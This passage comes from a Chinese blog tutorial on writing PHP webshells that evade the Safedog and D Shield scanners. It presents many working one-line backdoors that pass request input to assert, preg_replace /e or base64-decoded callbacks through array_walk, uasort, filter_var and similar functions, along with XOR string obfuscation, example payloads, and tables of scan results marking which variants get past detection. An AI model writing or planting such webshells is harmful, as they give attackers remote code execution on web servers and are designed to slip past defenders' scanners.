+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    array_filter(array($_POST[&#x27;x&#x27;]),&#x27;assert&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>依然无法 Bypass</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 array_filter 后门</td>
+<td>级别 5 array_filter 后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942745742742.png"><img src="https://image.3001.net/images/20200709/15942745742742.png" alt="img"></a></p>
+<p>看了下 P 神文章中的要更加灵活一些，assert 手动 Base64 编码后传入，这样还会把 assert 关键词给去掉了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class="line">    array_filter($arr, base64_decode($e));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 array_filter 后门</td>
+<td>级别 4 array_filter 参数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942748438914.png"><img src="https://image.3001.net/images/20200709/15942748438914.png" alt="img"></a></p>
+<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_map(myfunction,array1,array2,array3...)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>myfunction</em></td>
+<td>必需。用户自定义函数的名称，或者是 null。</td>
+</tr>
+<tr>
+<td><em>array1</em></td>
+<td>必需。规定数组。</td>
+</tr>
+<tr>
+<td><em>array2</em></td>
+<td>可选。规定数组。</td>
+</tr>
+<tr>
+<td><em>array3</em></td>
+<td>可选。规定数组。</td>
+</tr>
+</tbody></table>
+<p>array_map () 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。和 arrray_walk () 函数差不多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class="line">    array_map(base64_decode($e), $arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>依然被杀了，检测结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 array_map 执行</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942751656814.png"><img src="/images/15942751656814.png" alt="img"></a></p>
+<h2 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk()"></a>array_walk()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_walk(array,myfunction,parameter...)</span><br></pre></td></tr></table></figure>
+
+<p>array_walk () 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定数组。</td>
+</tr>
+<tr>
+<td><em>myfunction</em></td>
+<td>必需。用户自定义函数的名称。</td>
+</tr>
+<tr>
+<td><em>userdata</em>,…</td>
+<td>可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
+</tr>
+</tbody></table>
+<p>简单案例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">function myfunction($value,$key)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The key $key has the value $value&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;blue&quot;);</span><br><span class="line">array_walk($a,&quot;myfunction&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">The key a has the value red</span><br><span class="line">The key b has the value green</span><br><span class="line">The key c has the value blue</span><br></pre></td></tr></table></figure>
+
+<p>根据这个特性手动来写一个 webshell 试试看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    function sqlsec($value,$key)</span><br><span class="line">    &#123;   </span><br><span class="line">        $x = $key.$value;</span><br><span class="line">        $x($_POST[&#x27;x&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $a=array(&quot;ass&quot;=&gt;&quot;ert&quot;);</span><br><span class="line">    array_walk($a,&quot;sqlsec&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个 array_walk 有点复杂，国光我瞎折腾写了上面的这个 webshell 居然过掉狗了，不过这里用的是回调函数和自定义函数结合的姿势了。</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 2 (可疑) 变量函数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942629124282.png"><img src="/images/15942629124282.png" alt="img"></a></p>
+<p>看了下网上其他师傅们的姿势：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">  $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">  $arr = array($_POST[&#x27;x&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class="line">    array_walk($arr, $e, &#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时提交如下 payload 的话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">shell.php?e=preg_replace</span><br></pre></td></tr></table></figure>
+
+<p>最后就相当于执行了如下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">preg_replace(&#x27;|.*|e&#x27;,$_POST[&#x27;x&#x27;],&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这个时候只需要 POST <code>x=phpinfo();</code> 即可。这种主要是利用了 preg_replace 的 &#x2F;e 模式进行代码执行，关于这一块知识不懂的朋友可以参考我写的另一篇文章：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结</a></p>
+<p>不过这种方法已经凉了，安全狗和 D 盾均可以识别，而且这种 preg_replace 三参数后门的 <code>/e</code> 模式 PHP5.5 以后就废弃了：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 array_walk 执行</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942640674640.png"><img src="https://image.3001.net/images/20200709/15942640674640.png" alt="img"></a></p>
+<p>不过 PHP 止中不止 preg_replace 函数可以执行 eval 的功能，还有下面几个类似的：</p>
+<p><strong>mb_ereg_replace</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">mb_ereg_replace ( string $pattern , string $replacement , string $string [, string $option = &quot;msr&quot; ] ) : string</span><br></pre></td></tr></table></figure>
+
+<p>类似于 preg_replace 函数一样，也可以通过 e 修饰符来执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    mb_ereg_replace(&#x27;\d&#x27;, $_REQUEST[&#x27;x&#x27;], &#x27;1&#x27;, &#x27;e&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>preg_filter</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">mixed preg_filter ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+
+<p>preg_filter () 等价于 preg_replace () ，但它仅仅返回与目标匹配的结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    preg_filter(&#x27;|\d|e&#x27;, $_REQUEST[&#x27;x&#x27;], &#x27;2&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只是比较可惜，都无法过狗和 D 盾了。不过问题不大，感兴趣小伙伴可以去查阅 PHP 官方文档，还是可以找到类似函数的，国光亲测可以过狗和 D 盾。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    mb_eregi_replace(&#x27;\d&#x27;, $_REQUEST[&#x27;x&#x27;], &#x27;1&#x27;, &#x27;e&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="array-walk-recursive"><a href="#array-walk-recursive" class="headerlink" title="array_walk_recursive()"></a>array_walk_recursive()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_walk_recursive(array,myfunction,parameter...)</span><br></pre></td></tr></table></figure>
+
+<p>array_walk_recursive () 函数对数组中的每个元素应用用户自定义函数。该函数与 array_walk () 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定数组。</td>
+</tr>
+<tr>
+<td><em>myfunction</em></td>
+<td>必需。用户自定义函数的名称。</td>
+</tr>
+<tr>
+<td><em>userdata</em>,…</td>
+<td>可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class="line">    array_walk_recursive($arr, $e, &#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 php 后门回调木马</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200710/15943939546945.png"><img src="/images/15943939546945.png" alt="img"></a></p>
+<h2 id="array-reduce"><a href="#array-reduce" class="headerlink" title="array_reduce()"></a>array_reduce()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_reduce(array,myfunction,initial)</span><br></pre></td></tr></table></figure>
+
+<p>array_reduce () 函数向用户自定义函数发送数组中的值，并返回一个字符串。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定数组。</td>
+</tr>
+<tr>
+<td><em>myfunction</em></td>
+<td>必需。规定函数的名称。</td>
+</tr>
+<tr>
+<td><em>initial</em></td>
+<td>可选。规定发送到函数的初始值。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array(1);</span><br><span class="line">    array_reduce($arr, $e, $_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST 提交如下数据：<code>e=assert&amp;x=phpinfo();</code> 但是目前已经无法过狗了，GG：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 array_reduce 执行</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200710/15943944396028.png"><img src="/images/15943944396028.png" alt="img"></a></p>
+<h2 id="array-udif"><a href="#array-udif" class="headerlink" title="array_udif()"></a>array_udif()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_diff(array1,array2,array3...);</span><br></pre></td></tr></table></figure>
+
+<p>array_diff () 函数返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的键值。在返回的数组中，键名保持不变。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array1</em></td>
+<td>必需。与其他数组进行比较的第一个数组。</td>
+</tr>
+<tr>
+<td><em>array2</em></td>
+<td>必需。与第一个数组进行比较的数组。</td>
+</tr>
+<tr>
+<td><em>array3</em>,…</td>
+<td>可选。与第一个数组进行比较的其他数组。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array($_POST[&#x27;x&#x27;]);</span><br><span class="line">    $arr2 = array(1);</span><br><span class="line">    array_udiff($arr, $arr2, $e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST 提交如下数据：<code>e=assert&amp;x=phpinfo();</code> 但是目前已经无法过狗了，GG：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 php 后门回调木马</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200710/15943947566164.png"><img src="https://image.3001.net/images/20200710/15943947566164.png" alt="img"></a></p>
+<h2 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">uasort(array,myfunction);</span><br></pre></td></tr></table></figure>
+
+<p>uasort () 函数使用用户自定义的比较函数对数组排序，并保持索引关联（不为元素分配新的键）。如果成功则返回 TRUE，否则返回 FALSE。该函数主要用于对那些单元顺序很重要的结合数组进行排序。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定要进行排序的数组。</td>
+</tr>
+<tr>
+<td><em>myfunction</em></td>
+<td>可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">    uasort($arr, base64_decode($e));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST 提交的数据如下：<code>e=YXNzZXJ0&amp;x=phpinfo();</code> 这个后门在 PHP 5.3 之后可以正常运行，5.3 会提示 assert 只能有 1 个参数，这是因为 assert 多参数是后面才开始新增的内容，PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将 <code>description</code> 指定到 **assert ()**。：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200711/15944329043427.png"><img src="https://image.3001.net/images/20200711/15944329043427.png" alt="img"></a></p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 PHP 回调木马</td>
+<td>级别 4 uasort 参数</td>
+</tr>
+</tbody></table>
+<p>还有一个面向对象的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">   $arr = new ArrayObject(array(&#x27;test&#x27;, $_REQUEST[&#x27;x&#x27;]));</span><br><span class="line">   $arr-&gt;uasort(&#x27;assert&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="uksort"><a href="#uksort" class="headerlink" title="uksort()"></a>uksort()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">uksort(array,myfunction);</span><br></pre></td></tr></table></figure>
+
+<p>uksort () 函数通过用户自定义的比较函数对数组按键名进行排序。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定要进行排序的数组。</td>
+</tr>
+<tr>
+<td><em>myfunction</em></td>
+<td>可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    $arr = array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;x&#x27;] =&gt; 2);</span><br><span class="line">    uksort($arr, $e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST 的内容如下：<code>e=assert&amp;x=phpinfo();</code> 该方法也不能 Bypass 安全狗了：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 php 后门回调木马</td>
+<td>级别 5 已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200711/15944342292338.png"><img src="/images/15944342292338.png" alt="img"></a></p>
+<p>还有一个面向对象的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">   $arr = new ArrayObject(array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;x&#x27;] =&gt; 2));</span><br><span class="line">   $arr-&gt;uksort(&#x27;assert&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="registregister-shutdown-function"><a href="#registregister-shutdown-function" class="headerlink" title="registregister_shutdown_function()"></a>registregister_shutdown_function()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">register_shutdown_function ( callable $callback [, mixed $... ] ) : void</span><br></pre></td></tr></table></figure>
+
+<p>注册一个 <code>callback</code> ，它会在脚本执行完成或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exit.php">exit()</a> 后被调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    register_shutdown_function($e, $_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>安全狗 1 级，D 盾 5 级 已知后门。</p>
+<h2 id="register-tick-function"><a href="#register-tick-function" class="headerlink" title="register_tick_function()"></a>register_tick_function()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">register_tick_function ( callable $function [, mixed $arg [, mixed $... ]] ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>注册在调用记号时要执行的给定函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">    declare(ticks=1);</span><br><span class="line">    register_tick_function ($e, $_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>安全狗 1 级，D 盾 5 级 已知后门。</p>
+<h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">filter_var(variable, filter, options)</span><br></pre></td></tr></table></figure>
+
+<p>filter_var () 函数通过指定的过滤器过滤变量。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>variable</td>
+<td>必需。规定要过滤的变量。</td>
+</tr>
+<tr>
+<td>filter</td>
+<td>可选。规定要使用的过滤器的 ID。</td>
+</tr>
+<tr>
+<td>options</td>
+<td>规定包含标志 &#x2F; 选项的数组。检查每个过滤器可能的标志和选项。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    filter_var($_REQUEST[&#x27;x&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>安全狗 1 级，D 盾 5 级 已知后门。</p>
+<h2 id="filter-var-array"><a href="#filter-var-array" class="headerlink" title="filter_var_array()"></a>filter_var_array()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">filter_var_array(array, args)</span><br></pre></td></tr></table></figure>
+
+<p>filter_var_array () 函数获取多项变量，并进行过滤。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>array</td>
+<td>必需。规定带有字符串键的数组，包含要过滤的数据。</td>
+</tr>
+<tr>
+<td>args</td>
+<td>可选。规定过滤器参数数组。合法的数组键是变量名。合法的值是过滤器 ID，或者规定过滤器、标志以及选项的数组。该参数也可以是一个单独的过滤器 ID，如果是这样，输入数组中的所有值由指定过滤器进行过滤。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    filter_var_array(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;x&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>安全狗 0 级，D 盾 5 级 已知后门。</p>
+<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>P 神的一篇经典文章 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#">一些不包含数字和字母的 webshell</a> 里面提到了异或的姿势，目前只有第一种方法可以过狗了，后面两种方法以及不行了….. 所以本课只重点带大家来看一下第一种姿势。我们只要稍微修改一下也可以轻松过掉安全狗：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = (&#x27;!&#x27;^&#x27;@&#x27;).&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;;</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时就已经过掉安全狗了，D 盾检测级别降到了 3 级，检测结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 3 变量函数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942527416053.png"><img src="/images/15942527416053.png" alt="img"></a></p>
+<p>关于异或国光用 Python 写了一个体验比较友好的脚本：</p>
